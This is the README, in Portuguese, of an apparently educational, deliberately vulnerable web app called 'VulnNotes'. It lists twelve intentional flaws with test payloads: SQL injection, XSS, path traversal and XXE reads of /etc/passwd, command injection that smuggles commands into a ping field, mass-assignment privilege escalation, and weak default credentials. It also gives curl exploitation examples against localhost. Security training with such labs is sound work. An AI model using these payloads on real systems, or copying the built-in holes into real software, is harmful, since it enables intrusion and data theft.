# 🔓 VulnNotes - SaaS Propositalmente Vulnerável

Um sistema de notas desenvolvido para **fins educacionais** e **testes de segurança**. Este projeto contém múltiplas vulnerabilidades intencionais para demonstrar falhas de segurança comuns em aplicações web.

⚠️ **ATENÇÃO: NÃO USE EM PRODUÇÃO!** ⚠️

## 🎯 Vulnerabilidades Implementadas

### 1. SQL Injection
- **Endpoint**: `POST /login`, `GET /search`
- **Descrição**: Login e busca vulneráveis a SQL injection
- **Teste**: 
  - Login: `admin' OR '1'='1-- -`
  - Busca: `test' UNION SELECT username,password FROM users-- -`

### 2. Cross-Site Scripting (XSS)
- **Endpoint**: `/notes`, `/search`
- **Descrição**: Entrada de usuário não sanitizada
- **Teste**: `<script>alert('XSS')</script>`

### 3. Path Traversal
- **Endpoint**: `GET /file?path=`
- **Descrição**: Leitura de arquivos arbitrários do sistema
- **Teste**: `/file?path=../../../etc/passwd`

### 4. Command Injection
- **Endpoint**: `POST /ping`
- **Descrição**: Execução de comandos do sistema
- **Teste**: `127.0.0.1; ls -la` ou `127.0.0.1 && whoami`

### 5. Local File Inclusion (LFI)
- **Endpoint**: `GET /template?file=`
- **Descrição**: Inclusão de arquivos locais
- **Teste**: `/template?file=../package.json`

### 6. Information Disclosure
- **Endpoint**: `GET /debug`
- **Descrição**: Exposição de informações sensíveis do sistema
- **Teste**: Acesse `/debug` para ver senhas e variáveis de ambiente

### 7. XML External Entity (XXE)
- **Endpoint**: `POST /import`
- **Descrição**: Parser XML vulnerável a entidades externas
- **Teste**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### 8. Insecure Direct Object Reference (IDOR)
- **Endpoint**: `GET /notes?user=`
- **Descrição**: Acesso a dados de outros usuários
- **Teste**: Mude o parâmetro `user` para ver notas de outros usuários

### 9. Weak Authentication
- **Múltiplos usuários**: Senhas fracas e previsíveis
- **Credenciais**: admin/1234, guest/guest, test/(vazia), root/toor

### 10. Mass Assignment
- **Endpoint**: `POST /user/update`
- **Descrição**: Atualização de campos não intencionais
- **Teste**: 
```json
{
  "id": 1,
  "username": "hacker",
  "password": "newpass",
  "role": "admin"
}
```

### 11. Insecure Session Management
- **Endpoint**: `POST /session/create`, `GET /session/info`
- **Descrição**: IDs de sessão previsíveis e vazamento de sessões
- **Teste**: Session IDs no formato `sess_username_timestamp`

### 12. Unrestricted File Upload
- **Endpoint**: `POST /upload`
- **Descrição**: Upload sem validação de tipo ou tamanho
- **Teste**: Faça upload de arquivos maliciosos (.php, .sh, etc.)

## 🚀 Como Usar

1. Instale as dependências:
```bash
npm install
```

2. Execute o servidor:
```bash
node server.js
```

3. Acesse: http://localhost:3000

## 📋 Credenciais de Teste

| Usuário | Senha | Descrição |
|---------|--------|-----------|
| admin   | 1234   | Administrador |
| guest   | guest  | Usuário guest |
| test    | (vazia) | Usuário sem senha |
| root    | toor   | Usuário root |

## 🛠️ Ferramentas Recomendadas para Teste

- **Burp Suite**: Para interceptar e modificar requisições
- **OWASP ZAP**: Scanner de vulnerabilidades
- **sqlmap**: Para automação de SQL injection
- **curl**: Para testes manuais de API
- **Postman**: Para testes de endpoints

## 🔍 Exemplos de Exploração

### SQL Injection no Login
```bash
curl -X POST http://localhost:3000/login \
  -d "username=admin' OR '1'='1-- -&password=any"
```

### Command Injection
```bash
curl -X POST http://localhost:3000/ping \
  -d "host=127.0.0.1; cat /etc/passwd"
```

### Path Traversal
```bash
curl "http://localhost:3000/file?path=../../../etc/passwd"
```

### XXE Attack
```bash
curl -X POST http://localhost:3000/import \
  -d 'xml=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
```

## 📚 Referências Educacionais

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

## ⚖️ Uso Responsável

Este projeto é destinado **exclusivamente** para:
- Educação em segurança cibernética
- Treinamento de desenvolvedores
- Testes em ambiente controlado
- Demonstrações acadêmicas

**NÃO use este código em produção ou contra sistemas sem autorização explícita.**

## 🤝 Contribuições

Contribuições são bem-vindas! Se você encontrar uma vulnerabilidade interessante que pode ser adicionada para fins educacionais, abra uma issue ou pull request.

## 📄 Licença

ISC - Este projeto é fornecido "como está" para fins educacionais.

---
**Desenvolvido para fins educacionais em segurança cibernética** 🛡️
